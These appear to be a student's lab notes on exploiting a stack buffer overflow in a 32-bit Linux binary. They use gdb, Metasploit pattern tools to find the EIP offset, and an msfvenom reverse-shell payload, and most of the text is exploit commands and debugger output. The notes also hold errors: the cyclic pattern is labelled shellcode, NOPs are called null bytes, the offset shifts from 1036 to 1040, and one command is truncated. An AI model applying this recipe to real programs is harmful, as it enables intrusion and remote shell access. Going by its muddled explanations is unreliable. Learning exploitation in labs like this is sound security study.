When you overflow a binary you want to generarate some gibberish code that overflow the memory stack but you have to use the exact size of the payload
so you time to get to the EIP(Instruction pointer which holds the memory address of the next step).
If you match the right addresses then you have a continuity.


## Analyze the behavior of the binary
`gdb -q ./PATH/TO/BINARY`


## Send some gibberish code
`run $(python -c "print '\x55' * 1200")`
(This will send 1200 U chars.)

*Example:*
`Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1200")`
`*Program received signal SIGSEGV, Segmentation fault.*`
`*0x55555555 in ?? ()*`


## Generate a shell-code
`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt`
`Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9`
(Same as 1200 U's)


## Send the payload
`run $(python -c "print 'PAYLOADHERE'")`
(From the previous step)

*Example:*
The program being debugged has been started already.
`Start it from the beginning? (y or n) y`
`Starting program: /home/student/bow/bow32 $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'")`
`*Program received signal SIGSEGV, Segmentation fault.*`
`*0x69423569 in ?? ()*`


## Check that new address not same as EIP
As we said before they need to match so you get continuity in the stack so you can execute code in the same memory stack reserved for this application, that's how works.
`*(gdb) info registers eip*`
`*eip            0x69423569	0x69423569*`


## Calculate Offset size
This is the buffer size between ESP and EIP.
`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569`
`[*] Exact match at offset 1036`
(Use address from STEP 5.)


## Send the right EIP size
To fullfill the memory stack and rewrite the EIP portion at the end as well.
`EIP=default size is 4 bytes` (it holds the memory pointer to next portion


## Run again
`run $(python -c "print '\x55' * 1036 + '\x66' * 4")`
(This will send X55=U for 1036 which is the right offset + 4 bytes of EIP with x66=f. If everything went smooth you should be able write over stack+EIP.)


## Calculate Reverse shell size
`msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c`
*No encoder or bad-chars specified, outputting raw payload*
*Payload size: 68 bytes*
*< SNIP >*


## Reserve extra space
You have to add some NULL bytes before so you know code get's executed.  You have to reserve a bit more of the space of the reverse shell payload itself on previous step.
Example:
`*1040 bytes= to get to the EIP pointer*`
`*100 bytes= of NOP function before revshell so you are sure it get's executed right*`
`*150 bytes= used for the revshell code (68 was the size of the payload but we need a bit extra)*`

`Resulting:` 
 `Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786`
     `NOPs = "\x90" * 100`
`Shellcode = "\x44" * 150`
      `EIP = "\x66" * 4`


## Do the math
`run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" *` 

*The program being debugged has been started already.*
*Start it from the beginning? (y or n) y*
*Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')*
*Program received signal SIGSEGV, Segmentation fault.*
*0x66666666 in ?? ()*